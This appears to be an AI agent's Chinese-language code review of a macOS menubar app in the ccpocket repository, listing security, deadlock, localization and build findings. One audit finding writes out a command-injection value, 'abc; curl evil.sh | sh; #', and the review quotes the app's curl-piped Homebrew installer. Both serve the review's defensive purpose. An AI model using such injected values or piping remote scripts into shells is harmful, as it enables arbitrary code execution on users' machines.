I'll start by exploring the directory structure to understand the scope.
Found significant issues already. Let me continue reading.
## 一、架构概述

`apps/menubar` 是 ccpocket 仓库中一个**此前未被审查过的独立 macOS 菜单栏 App**（Swift 6.2 / SwiftUI，Xcode 26，`MACOSX_DEPLOYMENT_TARGET = 26.0`），代码量约 3100 行，26 个 Swift 文件。它的定位是「Mac 端的 Bridge 控制台 + 首次安装向导」：帮用户装好 Node/Codex CLI/Bridge、把 Bridge 注册成 launchd 服务、展示配额用量、并生成给手机 App 扫描的连接二维码。

- **入口**：`App/MenuBarApp.swift`（`@main`，Scene 只有空的 `Settings`），真正逻辑在 `App/AppDelegate.swift` —— 手动创建 `NSStatusItem` + 一个 `NSPanel`（非 popover），内嵌 `NSHostingView(PopoverContentView)`。`Info.plist` 里 `LSUIElement = true`，纯后台 App。
- **模块划分**：`Services/`（`BridgeClient` HTTP、`BridgeProcessManager` 子进程、`DoctorRunner`、`NetworkDiscovery`、`QRCodeGenerator`、`MockDoctorScenarios` 仅 DEBUG）→ `ViewModels/`（4 个 `@MainActor ObservableObject`）→ `Views/`（三个 Tab：Usage / Connect(QR) / Doctor，外加 `OnboardingView` 首启向导）→ `Models/`（纯 Codable DTO，对齐 Bridge 的 JSON）。
- **两条对外通道**：① 只读的本地 HTTP（`/health` `/version` `/usage` `/doctor`）；② 大量通过 `Process` 拉起 `/bin/zsh -li -c "<字符串>"` 执行 npm / brew / launchctl / CLI 登录。**风险几乎全部集中在第 ② 条通道上。**
- **工程化现状**：XcodeGen (`project.yml`)，但 `CCPocketMenubar.xcodeproj/project.pbxproj` 也被提交进仓库；`.github/workflows/` 下 13 个 workflow **没有任何一个引用 menubar**，即该 App 无 CI、无签名配置、目前不参与发布。

### 与 Bridge 的通信（回答问题 2）
- 协议：**明文 HTTP**，`BridgeClient.swift:9` 硬编码 `http://localhost:\(port)`，**用的是 `localhost` 而不是 `127.0.0.1`**（不是 `0.0.0.0`，方向正确）。
- 端口发现：**没有真正的发现机制**。`BridgeClient.swift:12` 读 `UserDefaults["bridgePort"]`，为 0 则回落 8765。而这个 key **全仓库没有任何一处写入**（见下方 F14），所以实际永远是 8765。
- 认证 token：**客户端完全不发 Authorization 头**。Bridge 侧 `packages/bridge/src/bridge-http-auth.ts:58,92` 规定 `/usage` `/doctor` 需鉴权，但 `isDirectLoopbackRequest()` 对回环请求直接放行 —— 所以目前能跑通，属于「靠 loopback 豁免」而非「有认证」。
- 超时：普通请求 5s（`BridgeClient.swift:14`），`/doctor` 60s（`:35`），`urlCache = nil`。
- **`BridgeProcessManager` 不直接托管 Bridge 子进程**，它是通过 `launchctl load/unload ~/Library/LaunchAgents/com.ccpocket.bridge.plist` 间接控制；但它自己会 fork 大量 `/bin/zsh` 子进程去跑安装命令。

---

## 二、发现清单

### 安全

**[P1] `/Users/huyiyang/AI agent/Codex/_keep/projects/ccpocket-worktrees/mobile-comprehensive-remediation-20260725/apps/menubar/CCPocketMenubar/Services/BridgeProcessManager.swift:80-85` — shell 字符串拼接导致命令注入（潜伏）**
- 问题：`setupService` 把 `port` / `apiKey` 直接字符串插值进要交给 `zsh -li -c` 的命令行。
- 触发场景：任何未来把 API Key 输入框接到 `DoctorViewModel.setupBridge(port:apiKey:)` 的改动。用户粘贴 `abc; curl evil.sh | sh; #` 即以用户权限任意执行。
- 证据：`var cmd = "npx --yes @ccpocket/bridge@latest setup"` / `if let apiKey, !apiKey.isEmpty { cmd += " --api-key \(apiKey)" }`；参数无引号、无转义。当前 UI 侧 `DoctorPageView.swift:184` 只调用 `viewModel.setupBridge()`（全 nil），所以**暂不可达**，属于埋雷。
- 修复方向：废弃 `shell(_ command: String)` 这一整套 API，改为 `Process.arguments = ["npx","--yes","@ccpocket/bridge@latest","setup","--api-key", apiKey]` 逐参数传递；若必须走 shell 则用环境变量传递密钥（`process.environment`）而非命令行（命令行参数在 `ps` 里全局可见，这本身也是泄露）。

**[P1] `.../Services/BridgeProcessManager.swift:65,70,77` — 家目录路径未加引号插入 shell**
- 问题：`plistPath = NSHomeDirectory() + "/Library/LaunchAgents/..."` 直接拼进 `launchctl load \(plistPath)`。
- 触发场景：家目录含空格/特殊字符时 `launchctl load` 参数被拆分，启停 Bridge 静默失败；若家目录路径可控则等价注入。
- 修复方向：同上，改用参数数组；退一步至少 `"launchctl load '\(plistPath)'"` 并转义单引号。

**[P1] `.../Services/BridgeProcessManager.swift:110-115` 与 `.../ViewModels/DoctorViewModel.swift:321` — 从网络下载脚本直接执行（curl | bash）**
- 问题：`"/bin/bash -c \"$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh)\""`，无 checksum、无签名校验、无版本 pin，且是在一个**未开启沙箱**的 GUI App 里静默执行（用户点「Install Node.js」按钮触发，`DoctorViewModel.swift:181` → `installNodeViaHomebrew`）。
- 证据：`HEAD` 分支意味着内容随时可变；GitHub raw 被劫持/账号被接管即等于本机 RCE。
- 修复方向：不要代跑，改用已有的 `openTerminalGuide` 把命令复制到剪贴板让用户自己在 Terminal 里执行（该路径已存在于 `BridgeProcessManager.swift:158`）；或至少 pin 到具体 commit SHA 并校验 sha256。

**[P2] `.../Services/BridgeProcessManager.swift:81,89,94` 与 `.../Services/DoctorRunner.swift:30` — `npx --yes @ccpocket/bridge@latest` 供应链风险**
- 问题：4 处使用 `--yes`（跳过安装确认）+ `@latest`（不锁版本）从 npm 下载并执行代码；`installOrUpdateBridge` 还是 `npm install -g`。
- 触发场景：npm 包被投毒 / 账号被盗 / typosquat 时，用户只要点一下「Update」按钮即中招。
- 修复方向：Bridge 版本已能通过 `/version` 与 `npm view` 拿到（`BridgeProcessManager.swift:179`），应改为安装明确版本号并做 `npm audit signatures` 校验。

**[P2] `.../Services/BridgeProcessManager.swift:13-14`、`.../Services/DoctorRunner.swift:29-30` — 一律使用 `zsh -li`（登录+交互式）**
- 问题：`-i` 会 source 用户的 `~/.zshrc`，App 的每一次探测（包括每次打开面板触发的 `npm view`）都在执行用户的任意 shell 配置代码；同时 `-i` 在无 TTY 环境下容易触发 job-control 警告、`compinit` 提示，甚至阻塞等待输入。
- 修复方向：改 `zsh -lc`（去掉 `-i`），或显式构造 PATH。

**[P1] `.../Services/NetworkDiscovery.swift:60-71` + `.../ViewModels/QRCodeViewModel.swift:19-20,51-56` + `.../Views/QRCodePage/QRCodePageView.swift:52-56,81` — 连接凭据以明文二维码 + 明文文本同屏展示，且密钥存于 UserDefaults**
- 问题三连：
  1. `buildConnectionURL` 会把 API Key 作为 `token=` 查询参数编进 `ccpocket://connect?url=ws://<内网IP>:<port>&token=<key>`；
  2. 该字符串既渲染成二维码（`:52`），**又以可选中的明文 `Text` 直接显示在面板上**（`QRCodePageView.swift:81`，仅中间截断，`textSelection` 可复制）；任何截屏、录屏、屏幕共享、肩窥都会泄露长期凭据。
  3. 密钥来源是 `UserDefaults.standard.string(forKey: "bridgeApiKey")` —— 明文写在 `~/Library/Preferences/*.plist`，未进 Keychain。
- 更严重的是：由于 `bridgeApiKey` **从未被写入**（见 F14），二维码今天实际是**无 token 的 `ws://` 明文地址**。结合 Bridge 默认 `BRIDGE_HOST = "0.0.0.0"`（`packages/bridge/src/index.ts:48`）且默认无 API Key，等于这个二维码在向同一 LAN 广播一个可直接拿到 Claude/Codex CLI 执行能力的无鉴权入口。
- 修复方向：① 密钥迁 Keychain；② 明文 deep link 默认打码，点击「显示」才展开，且 token 部分永不明文渲染；③ 生成二维码前若检测到 Bridge 未配置 API Key，应在 UI 上给出明确的红色告警而不是照常出码。

**[P2] `.../CCPocketMenubar/CCPocketMenubar.entitlements:1-9` — 未开启 App Sandbox**
- 现状：entitlements 只有 `com.apple.security.network.client`，**没有 `com.apple.security.app-sandbox`**；`project.yml:31` 开了 `ENABLE_HARDENED_RUNTIME: YES`。
- 评价：对一个需要 `Process` 拉起 zsh/npm/brew 的 App 来说不开沙箱是必然的，但要明确后果：① 无法上架 Mac App Store；② 恶意/被篡改的 `~/.zshrc` 内容会以该 App 的完整用户权限运行；③ 没有任何文件访问范围限制。`network.client` 范围合适（App 不监听端口，未申请 `network.server`，正确）。
- 修复方向：至少在文档中明确「非沙箱、仅通过 Developer ID 分发」，并考虑把执行命令的能力拆到一个 XPC/特权 helper 里收敛攻击面。

**[P2] `.../Services/BridgeProcessManager.swift:213-217` 与 `.../Services/DoctorRunner.swift:71` — 原始子进程输出直接作为用户可见错误文案**
- 问题：`ProcessError` 在匹配不到已知模式时 `return String(trimmed.suffix(200))`，把 zsh 合并后的 stdout+stderr 尾部 200 字符原样抛给 UI（`DoctorPageView.swift:117`、`OnboardingView.swift:173`）；`DoctorError.parseFailed` 同理输出前 200 字符。
- 触发场景：`claude auth login` / `codex --login` / `npm` 失败时，输出中常含家目录绝对路径、npm registry 认证错误、临时 token 片段、代理地址。
- 修复方向：白名单化错误映射，未匹配时只显示通用文案 + 「查看详情」折叠区，并在写日志前做路径与凭据脱敏。

**[P3] `.../Services/NetworkDiscovery.swift:7-57` — 内网信息暴露面（可接受但有噪声）**
- `getifaddrs` 枚举全部 IPv4 接口，只过滤 `127.*`。Docker bridge（172.17.x）、link-local（169.254.x）、其他 VPN 的 `utun` 都会被列出并标成 LAN/Tailscale，用户可能选到一个手机根本连不上的地址。信息只在本机 UI 展示，不外发，风险低；分类逻辑 `ip.hasPrefix("100.")`（应为 100.64.0.0/10 CGNAT）也不严谨。

**其他：无硬编码密钥。** 全量 grep 只有 `https://openai.com/codex`（`DoctorPageView.swift:284`）和 Homebrew 安装脚本 URL 两个外部地址，`Info.plist` 无 `NSAppTransportSecurity`/`NSAllowsArbitraryLoads`（默认 ATS 生效，`localhost` 走无点主机名豁免，OK）。

---

### 可靠性 / 子进程管理（本次最实质的一类问题）

**[P0] `.../Services/BridgeProcessManager.swift:35-39` 与 `.../Services/DoctorRunner.swift:49-52` — 经典 Pipe 死锁：先 `waitUntilExit()` 后 `readDataToEndOfFile()`**
- 问题：`process.waitUntilExit()` 在前、`pipe.fileHandleForReading.readDataToEndOfFile()` 在后。管道缓冲区（约 64KB）写满后子进程会阻塞在 write 上，而父进程正卡在 waitUntilExit —— 互相等待。
- 触发场景：**必然发生**。`brew install node`、Homebrew 安装脚本、`npm install -g @anthropic-ai/claude-code` 的输出都远超 64KB。表现为「Install Node.js」按钮转圈直到 300s/600s 超时后报错，而实际安装可能已成功一半。
- 加剧因素：超时处理只做 `process.terminate()`（SIGTERM 给 zsh），**不杀进程组**；孙进程（node/npm/curl）仍持有管道写端，导致 `readDataToEndOfFile()` 在 zsh 退出后**仍可能永久阻塞**。
- 修复方向：改用 `pipe.fileHandleForReading.readabilityHandler` 或 `process.terminationHandler` 异步收集输出（先读后等），或用 `Process.standardOutput = FileHandle(forWritingAtPath:)` 落临时文件；超时时用 `kill(-pgid, SIGKILL)` 并 `setsid` 建独立进程组。

**[P1] `.../Services/BridgeProcessManager.swift:11` 与 `.../Services/DoctorRunner.swift:27` — 在 `withCheckedThrowingContinuation` 内同步阻塞协作线程池**
- 问题：`shell` / `runDoctorCLI` 都是 `nonisolated async`，continuation body 直接在协作线程池的线程上跑 `waitUntilExit()`，最长阻塞 600s（`installHomebrew`）。Swift 协作线程池线程数 = CPU 核数，几个并发安装即可耗尽，拖垮整个 async 运行时。
- 修复方向：包一层 `Task.detached` / 专用 `DispatchQueue`，或改用 `process.terminationHandler` + continuation 的纯异步写法（不阻塞任何线程）。

**[P1] `.../Services/BridgeProcessManager.swift:110-115,142-152` — 交互式命令在无 TTY 下执行，功能实际不可用**
- 问题：Homebrew 安装脚本需要按 RETURN 确认且需 `sudo`（无 tty 时 `sudo: no tty present` 直接失败）；`claude auth login` / `codex --login` 是需要 TTY 的交互式流程。三者都被 `Process` + `Pipe`（无伪终端）拉起。
- 证据：`loginProvider` 的注释写着「spawns claude auth login which opens the browser and waits for OAuth callback」，但代码路径无 TTY、无 stdin，实际大概率直接失败或挂到 120s 超时。
- 修复方向：这三个动作全部改走 `openTerminalGuide`（该函数已实现且更安全），或使用 `NSAppleScript`/`open -a Terminal` 在真实终端里执行。

**[P2] `.../Services/BridgeProcessManager.swift:146` vs `.../ViewModels/DoctorViewModel.swift:358` — 同一动作两套不一致的命令**
- 证据：程序化执行用 `"claude auth login"`，而复制给用户的命令是 `"claude login"`。Claude Code CLI 的实际子命令是 `claude login`，前者疑为错误。`codex --login`（`:148` / `:360`）同样需要核实（Codex CLI 为 `codex login`）。
- 修复方向：抽成单一常量来源，并加一条针对命令字符串的单测/快照。

**[P2] `.../ViewModels/QRCodeViewModel.swift:15,20` 与 `.../Services/BridgeClient.swift:12` — `bridgePort` / `bridgeApiKey` 只读不写，无设置界面**
- 证据：全仓库 grep 这两个 key，只有 3 处读、0 处写。
- 触发场景：用户执行 `bridge setup --port 9000` 或设置了 `BRIDGE_API_KEY` 后，菜单栏 App 仍去连 8765、仍生成不带 token 的二维码，Usage/Doctor 面板长期显示「Bridge Not Running」。
- 修复方向：要么补一个设置面板并把密钥存 Keychain，要么直接解析 `~/Library/LaunchAgents/com.ccpocket.bridge.plist` 的 `EnvironmentVariables` 取真实 PORT / API_KEY。

**[P2] `.../Views/PopoverContentView.swift:39-45` — `onAppear` 只会触发一次，面板数据不刷新**
- 问题：`NSHostingView` 在 `applicationDidFinishLaunching`（`AppDelegate.swift:28-30`）创建后终生存在，面板靠 `orderOut` / `orderFrontRegardless` 显隐（`AppDelegate.swift:75,86`）。`orderOut` 不保证触发 SwiftUI 的 disappear/appear，因此 `viewModel.checkHealth()` 和首个 tab 的 `fetchUsage()` 很可能只在首次弹出时跑一次。
- 触发场景：用户第二次点击菜单栏图标，状态灯和用量数据是陈旧的。注释「Fetch on popover open instead of polling」的意图未被实现。
- 修复方向：在 `AppDelegate.openPanel()` 里显式调用 VM 刷新，或改用真正的 `NSPopover` / `MenuBarExtra`。

**[P2] `.../ViewModels/AppViewModel.swift:120,128-137` — 每次健康检查都 fork 一个登录 shell 去访问 npm registry**
- 问题：`checkHealth()` 成功后无条件调用 `checkForBridgeUpdate` → `latestBridgeVersion()` → `zsh -li -c "npm view @ccpocket/bridge version"`。这是「source 整个 .zshrc + 一次网络往返」，1–3s 起步，且 `checkHealth` 无去重保护。
- 修复方向：加 24h 缓存（`UserDefaults` 存上次检查时间戳），或改为直接 `URLSession` 请求 `https://registry.npmjs.org/@ccpocket/bridge/latest`，完全避开 shell。

**[P3] `.../Services/BridgeClient.swift:34-36` — 每次调用 `doctor()` 新建一个 `URLSession` 且从不 `invalidateAndCancel()`**：`URLSession` 会持有自身直到失效，每次 Doctor 刷新泄漏一个 session + 其代理队列。建议提升为存储属性。

**[P3] 未取消的非结构化 Task**：`AppViewModel.swift:93,112,129`、`DoctorViewModel.swift:101,383`、`UsageViewModel.swift:17` 全是裸 `Task { }`，无 `cancel()` 持有。`fetchUsage`/`runDoctor` 有 `isLoading`/`isRunning` 守卫，但 **`performAction`（`DoctorViewModel.swift:379`）没有**——连点两次「Install Codex」会并发跑两个 `npm install -g`，`actionInProgress` 互相覆盖，且各占一个被阻塞的协作线程。

**Retain cycle：未发现。** `AppDelegate.swift:80` 的全局事件监听闭包正确使用了 `[weak self]`；`performAction` 的逃逸闭包捕获 self 但只在 Task 存活期间持有，Task 结束即释放，不构成环。**Timer/轮询：全项目 0 个 `Timer`**，这点是好的。

---

### 错误处理

**[P3] `try?` 吞异常共 5 处**：`DoctorRunner.swift:17`（HTTP doctor 失败静默降级到耗时 60s 的 CLI，用户完全不知道为什么变慢）、`AppViewModel.swift:102,117`、`DoctorViewModel.swift:387`、`BridgeProcessManager.swift:179`。其中 `DoctorRunner.swift:17` 值得改为区分「连接失败」（降级合理）与「解码失败/500」（应报错）。

**[P3] `print()` 日志**：`AppViewModel.swift:106,149` 用 `print` 输出错误对象；`error` 可能是携带 shell 输出的 `ProcessError`。建议改 `os.Logger` 并对含路径/凭据的字段标记 `privacy: .private`。

**[P3] 强解包**：`BridgeClient.swift:9` `URL(string: "http://localhost:\(port)")!`（port 为 Int，实际安全）、`DoctorPageView.swift:284` `URL(string:"https://openai.com/codex")!`（静态常量，安全）、`AppDelegate.swift:6-7` 的 `NSStatusItem!` / `NSPanel!` 隐式解包（`applicationDidFinishLaunching` 中赋值，实践安全）。**无 force try，无数组越界风险**（`OnboardingView.swift:71,298,418` 的 `steps[0/1/2]` 对应固定 3 元素字面量数组，安全）。

**[P3] `.../Views/DoctorPage/DoctorPageView.swift:177-188` — 死 UI**：`actionFor` 对 `"Bridge Server"` 状态为 fail 时返回 `nil`（只有 `"launchd service" where status == "skip"` 才有动作），意味着 Bridge 未安装时「必需项」那一行没有任何可操作按钮。

**[P3] 未使用的死代码**：`BridgeProcessManager.isServiceRegistered()`（`:55`）、`DoctorViewModel.uninstallBridge()`（`:173`）、`allSetupCommands(for:)`（`:285`）、`openSetupTerminal(for:)`（`:226`）、`copySetupCommands()` 与 `copySetupCommands(for:)`（`:233,252`）全部零调用点。

---

### 本地化

**[P2] `.../CCPocketMenubar/Localizable.xcstrings` — 仅覆盖英语(源) + 日语，无中文**
- 证据：`sourceLanguage = "en"`，125 个 key，`localizations` 中出现的语言集合 = `['ja']`，ja 覆盖率 125/125（无 missing）。**没有 zh-Hans / zh-Hant / ko 等任何其他语言。**
- 修复方向：如果这个 App 计划面向中文用户，需要新增 zh-Hans（125 条）。注意其中约 8 个 key（`Git`、`Keychain access`、`Screen Recording`、`Firebase connectivity`、`Port availability`、`npm dependencies`、`Data directory`、`Terminal`）是 Bridge 端 doctor 检查名，走 `DoctorReport.swift:25-31` 的**运行时动态 key** 查表，编译器不会提取，新增 Bridge 检查项时必须手工同步 xcstrings。

**[P3] Swift 代码中未本地化的用户可见字符串 —— 共 9 处 / 4 个文件**
| 文件:行号 | 内容 | 说明 |
|---|---|---|
| `.../Views/UsagePage/UsagePageView.swift:108` | `label: "5-hour"` | 传入 `String` 变量后 `UsageGaugeView.swift:31` 的 `Text(label)` 走 verbatim 重载，**不参与本地化**；且 `"5-hour"` 不在 xcstrings 中 |
| `.../Views/UsagePage/UsagePageView.swift:115` | `label: "7-day"` | 同上，`"7-day"` 亦不在 xcstrings 中 |
| `.../Models/UsageInfo.swift:16` | `"—"` | resetsInText 兜底 |
| `.../Models/UsageInfo.swift:18` | `"now"` | 不在 xcstrings |
| `.../Models/UsageInfo.swift:24` | `"\(hours)h \(minutes)m"` | 硬编码英文时间格式，应改 `Date.RelativeFormatStyle` / `DateComponentsFormatter` |
| `.../Models/UsageInfo.swift:26` | `"\(minutes)m"` | 同上 |
| `.../Services/DoctorRunner.swift:71` | `"Failed to parse doctor output: ..."` | `LocalizedError.errorDescription` 未用 `String(localized:)`，会直接显示在 UI |
| `.../Services/BridgeProcessManager.swift:216` | `String(trimmed.suffix(200))` | 兜底错误文案 = 原始英文 shell 输出（同时是 P2 泄露问题） |
| `.../Views/PopoverContentView.swift:145` | `Text("Off")` | DEBUG-only mock picker，可忽略 |

另：`.../Services/MockDoctorScenarios.swift:14-19` 有 6 条**硬编码日语**（`"すべて合格"` 等），因包在 `#if DEBUG` 内不影响发布版。`.../Views/DoctorPage/CheckResultRow.swift:32` 的 `Text(check.message)` 与 `.../Views/UsagePage/UsagePageView.swift:98` 的 `Text(error)` 直接渲染 Bridge 返回的英文，属于跨进程文案未本地化，需在 Bridge 侧改造或在 App 侧建映射表。

**[P3] `.../ViewModels/QRCodeViewModel.swift:28` — 用已本地化的字符串做逻辑判断**
- 证据：`addresses.first(where: { $0.label == "LAN" })`，而 `label` 来自 `NetworkDiscovery.swift:45,47` 的 `String(localized: "LAN")`。今天日语把 "LAN" 译作 "LAN" 所以侥幸能跑，一旦某语言翻译成「局域网」，自动选址逻辑立即静默失效并回落到 `addresses.first`（可能是 Docker 网卡地址）。
- 修复方向：`NetworkAddress` 增加一个 `enum Kind { case lan, tailscale }` 字段，`label` 只用于展示。

**xcstrings 中的僵尸 key（P3，清理项）**：`Welcome to CC Pocket`、`Get Started`、`Continue`、`Continue Anyway`、`Environment Check`、`Fix`、`Copy`、`Copy All`、`You're All Set!`、`Enable/Disable Launch at Login`、`Install Claude Code (either one is OK)`、`Install Codex (either one is OK)`、`Let's make sure everything is set up correctly.` 等 ~15 条在代码中已无对应引用（应为改版残留）。

---

### 构建与发布

**[P2] `/Users/huyiyang/AI agent/Codex/_keep/projects/ccpocket-worktrees/mobile-comprehensive-remediation-20260725/apps/menubar/project.yml:33` — `DEVELOPMENT_TEAM: ""` + `CODE_SIGN_STYLE: Automatic`，且无任何 CI**
- 证据：`.github/workflows/` 下 13 个 workflow（含 `macos-release.yml`）全文 grep `menubar` / `CCPocketMenubar` / `xcodegen` **零命中**。这个 App 既不构建、不签名、不公证、也不随 release 分发。
- 影响：`ENABLE_HARDENED_RUNTIME: YES` 加上空 TEAM，本地 `xcodebuild` 只能 ad-hoc 签名，无法公证，用户下载后会被 Gatekeeper 拦截。同时因为没有 CI，本次审查发现的编译期问题不会有任何自动化兜底。
- 修复方向：补一个 `menubar-release.yml`（xcodegen generate → xcodebuild archive → Developer ID 签名 → notarytool → DMG），或明确标注此目录为实验性、不发布。

**[P2] `.../CCPocketMenubar/Info.plist:4-7` — 只有 `LSUIElement`，缺关键 Bundle 键**
- 证据：整个 plist 只有一个 key。`project.yml:13-14` 定义了 `MARKETING_VERSION` / `CURRENT_PROJECT_VERSION`，但工程既未设 `GENERATE_INFOPLIST_FILE=YES` 也未设 `INFOPLIST_KEY_*`，两者不会被注入到这个手写的 plist 中 → 产物很可能缺 `CFBundleShortVersionString` / `CFBundleVersion`，而公证与 `SMAppService` 均依赖版本键。
- 另注：无 `NSHumanReadableCopyright`、无 `LSApplicationCategoryType`。`LSUIElement = true` 设置正确；**无 ATS 例外配置**（正确，未开 `NSAllowsArbitraryLoads`）；App 只访问 loopback，不需要 `NSLocalNetworkUsageDescription`。

**[P3] `project.yml:5,12` — `macOS 26.0` 部署目标**：代码大量使用 `glassEffect` / `GlassEffectContainer`（`PopoverContentView.swift:13,24,128` 等），确实是 macOS 26 Liquid Glass API，所以门槛无法降低 —— 但这意味着该 App 只能在 macOS 26+ 运行，可用户群极小，需在 README/发布说明中明示。

**[P3] `.../CCPocketMenubar.xcodeproj/project.pbxproj` 被提交进仓库**：与 `project.yml`（XcodeGen）并存，`.gitignore` 只忽略了 `build/` `DerivedData/`。两者会漂移；建议把 `*.xcodeproj` 加入 `.gitignore`，只保留 `project.yml` 作为唯一事实来源。

---

## 三、优先处理建议（按投入产出）

1. **先修 P0 管道死锁**（`BridgeProcessManager.swift:35-39` + `DoctorRunner.swift:49-52`）—— 这是唯一一个「必然复现、功能直接不可用」的缺陷。
2. **把 `shell(String)` 整体替换为参数数组 API**，一次性消灭 F1（apiKey 注入）、F2（路径未引号）和 `-i` 带来的 rc 文件执行面。
3. **交互式命令全部改走 `openTerminalGuide`**，同时解决「无 TTY 必失败」和「curl|bash 静默 RCE」两个问题。
4. **补 `bridgeApiKey` 的 Keychain 存储 + 设置界面**，并让二维码在无 token 时明确告警 —— 否则 Connect 标签页当前等于在向 LAN 分发一个无鉴权入口。
5. 本地化补 zh-Hans（125 条）并修掉上面列出的 9 处硬编码字符串与 `label == "LAN"` 逻辑耦合。
